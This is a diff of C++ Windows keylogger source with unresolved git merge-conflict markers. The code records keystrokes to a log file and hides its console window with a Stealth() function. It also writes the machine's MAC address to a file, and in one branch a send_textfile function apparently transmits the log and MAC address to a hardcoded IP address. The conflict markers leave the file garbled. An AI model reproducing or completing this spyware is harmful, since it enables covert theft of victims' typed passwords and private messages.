@@ -1,11 +1,18 @@
+<<<<<<< HEAD
 #define _WINSOCK_DEPCRECATED 
 #include "stdafx.h"
 #include <winsock2.h>
+=======
+#include "stdafx.h"
+#pragma comment(lib, "ws2_32.lib")
+
+>>>>>>> Merge_mij992900
 #include <iostream>
 #include <windows.h>
 #include <winuser.h>   
 #include <string.h>
 #include <stdlib.h>
+<<<<<<< HEAD
 #pragma comment(lib, "ws2_32.lib")
 
 #define ip "35.193.14.199"
@@ -81,6 +88,43 @@ void txt_reset() //Initialize the contents of Notepad
 }
 
 int Save(int key_stroke, char *file) //Save the text in Notepad
+=======
+#include<WinSock.h>
+#include<IPHlpApi.h>
+#pragma comment(lib, "iphlpapi.lib" )
+
+using namespace std;
+int Save(int key_stroke, char *file);
+void Stealth();
+
+
+void user_Address()//mac_address 불러오는 함수
+{
+	char strMac[256];
+	char username[500] = "C:\\Temp\\UserMac.txt";
+	FILE *OUTPUT_FILE;
+	OUTPUT_FILE = fopen(username, "a+");
+
+	DWORD size = sizeof(PIP_ADAPTER_INFO);
+	PIP_ADAPTER_INFO Info;
+	ZeroMemory(&Info, size);
+	int result = GetAdaptersInfo(Info, &size);//첫번째 랜카드 Mac adrress 가져오기
+	if (result == ERROR_BUFFER_OVERFLOW)//getadaptersinfo가 메모리 부족하면 재할당하고 재호출
+	{
+		Info = (PIP_ADAPTER_INFO)malloc(size);
+		GetAdaptersInfo(Info, &size);
+	}
+
+	sprintf(strMac, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",
+		Info->Address[0], Info->Address[1], Info->Address[2], Info->Address[3], Info->Address[4], Info->Address[5]);
+
+	fprintf(OUTPUT_FILE, "%s", strMac);
+	fclose(OUTPUT_FILE);
+}
+
+
+int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
+>>>>>>> Merge_mij992900
 {
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0;
@@ -93,7 +137,11 @@ int Save(int key_stroke, char *file) //Save the text in Notepad
 	if (key_stroke == 8)
 		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 	else if (key_stroke == 13)
+<<<<<<< HEAD
 		fprintf(OUTPUT_FILE, "%s", "\n");
+=======
+		fprintf(OUTPUT_FILE, "%s", "[Enter]");
+>>>>>>> Merge_mij992900
 	else if (key_stroke == 32)
 		fprintf(OUTPUT_FILE, "%s", " ");
 	else if (key_stroke == VK_TAB)
@@ -118,17 +166,39 @@ int Save(int key_stroke, char *file) //Save the text in Notepad
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 	else if (key_stroke == 190 || key_stroke == 110)
 		fprintf(OUTPUT_FILE, "%s", ".");
+<<<<<<< HEAD
+=======
+	else if (key_stroke == 186)
+		fprintf(OUTPUT_FILE, "%s", "@");
+	else if (key_stroke >= 96 && key_stroke <= 105)
+		fprintf(OUTPUT_FILE, "%c", (key_stroke - 48));
+	else if (key_stroke == 106)
+		fprintf(OUTPUT_FILE, "%s", "*");
+	else if (key_stroke == 107)
+		fprintf(OUTPUT_FILE, "%s", "+");
+	else if (key_stroke == 109)
+		fprintf(OUTPUT_FILE, "%s", "-");
+	else if (key_stroke == 110)
+		fprintf(OUTPUT_FILE, "%s", ".");
+	else if (key_stroke == 111)
+		fprintf(OUTPUT_FILE, "%s", "/");
+>>>>>>> Merge_mij992900
 	else
 		fprintf(OUTPUT_FILE, "%s", &key_stroke);
 	fclose(OUTPUT_FILE);
 	return 0;
 }
+<<<<<<< HEAD
 void Stealth()
+=======
+void Stealth()//콘솔창 숨기기
+>>>>>>> Merge_mij992900
 {
 	HWND Stealth;
 	AllocConsole();
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(Stealth, 0);
+<<<<<<< HEAD
 }
 
 int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of txtfile
@@ -200,4 +270,6 @@ int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of
 	WSACleanup();
 	//system("pause");
 	return 0;
+=======
+>>>>>>> Merge_mij992900
 }
